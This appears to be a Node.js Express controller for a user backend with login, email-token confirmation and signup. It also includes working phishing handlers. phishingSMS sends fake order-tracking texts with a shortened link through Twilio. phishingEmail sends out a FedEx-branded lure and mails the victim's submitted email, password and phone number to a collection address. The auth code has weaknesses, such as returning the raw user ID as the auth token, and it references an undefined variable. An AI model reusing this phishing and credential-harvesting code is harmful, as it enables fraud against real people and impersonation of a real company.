const bcrypt = require('bcryptjs')
const jwt = require('jsonwebtoken')
const sendEmail = require('../functions/sendEmail')

const User = require('../models/user.model')

const accountSID = process.env.TWILIO_ACCOUNT_SID
const authToken = process.env.TWILIO_AUTH_TOKEN
const phoneNumber = process.env.TWILIO_PHONE_NUMBER

const client = require('twilio')(accountSID, authToken)

module.exports = {
    async login(req, res) {
        const { email, password } = req.body;
         
        const user = await User.findOne({ email });
        if(!user) return res.status(400).json({ message: 'Email or password are incorrect' });
    
        const validPassword = await bcrypt.compare(password, user.password);
        if(!validPassword) return res.status(400).json({ message: 'Email or password are incorrect' });
    
        const token = user.generateAuthToken()

        await User.findOneAndUpdate({ email }, { $set: { currentLoginToken: token } })

        mailOptions = {
            from: "from-example@email.com",
            to: "from-example@email.com",
            subject: "Confirm account",
            html: `                
                <p>Please confirm your email using the following token</p>
                <p>Token: ${token}</p>
            `,
        }

        sendEmail(mailOptions)
    
        return res.status(200).json({ message: 'Confirm your account inserting the code sent to your email' });
    },

    async confirmLogin(req, res) {
        const email = req.body.email
        const token = req.body.token
        
        try {
            // fetch token in database
            const user = await User.findOne({ email })
            const currentLoginToken = user.currentLoginToken

            const decodedID = jwt.verify(token, process.env.SECRET)._id
            const decodedIDInDatabase = jwt.verify(currentLoginToken, process.env.SECRET)._id

            return (decodedID == decodedIDInDatabase) ? 
                res
                    .header('x-auth-token', decodedIDInDatabase)
                    .header('access-control-expose-headers', 'x-auth-token')
                    .status(200).json({
                        message: "Logged In with success", 
                        user: { 
                            fullname: user.name, 
                            email:  user.email,
                            phoneNumber: user.phoneNumber
                        }}) : 
                res.status(400).json({ message: "Invalid token" })
        } catch(err) {
            console.log("Error")
            return res.status(400).json("Please, sign in again")
        }
    },

    async getCurrentUser(req, res) {
        const user = await User.findById(req.user._id).select('-password -currentLoginToken -createdAt')
        return res.status(200).json(user)
    },

    async getUserByEmail(req, res) {
        const user = await User.findOne({email: req.params.email}).select('-password -email -currentLoginToken -createdAt')
        return res.status(200).json({user: user})
    },

    async signup(req, res) {
        const { name, email, phoneNumber, password } = req.body

        const hashedPassword = await bcrypt.hash(password, 12)

        const user = await User.find({ email })

        if(user.length !== 0) return res.status(400).json({ message: 'User already exists' })

        const newUser = new User({
            name,
            email,
            phoneNumber,
            password: hashedPassword,
            currentLoginToken: "none",
            createdAt: new Date(),
        })

        await newUser.save()

        return res
            .status(200)
            //.header('x-auth-token', token)
            .header('access-control-expose-headers', 'x-auth-token')
            .json({
                message: 'User created with success',
                user: {
                    _id: newUser._id,
                    name: newUser.name,
                    email: newUser.email,
                },
      });
    },

    async phishingSMS(req, res) {
        const phoneNumber = req.body.phoneNumber
        client.messages.create({
            body: `Click in the following link to track your order. https://shorturl.at/tySU8`,
            from: phoneNumber,
            to: "+351" + phoneNumber
        })
        .then(message => console.log(message.sid));
         return res.status(200).json("Sent")
    },

    async phishingEmail(req, res) {
        const {email, password, phoneNumber} = req.body
        mailOptions = {
            from: "from-example@email.com",
            to: "from-example@email.com",
            subject: "Fedex - Track your order",
            html: `
                ${phoneNumber == "" ? `<img style="width: 50%" src="cid:uniqueaq@kreata.ee"/>
                <h3>Dear customer,</h3>
                <p>Please, login and provide your mobile number to contact you when the order arrives.</p><a href="http://localhost:3000/phone-number"> Click here </a> to enter your phone number` : ""}
                
                <p>Email: ${email}</p><p>Password: ${password}</p><p>Phone Number: ${phoneNumber}</p><p>Date: ${timestamp}<p/>
            `,
            attachments: [{
                filename: 'image.png',
                path: './src/img/fedex.jpg',
                cid: 'uniqueaq@kreata.ee' //same cid value as in the html img src
            }]
        }

        sendEmail(mailOptions)
    
        return res.status(200).json({message: "Email sent", status: true})
    },

}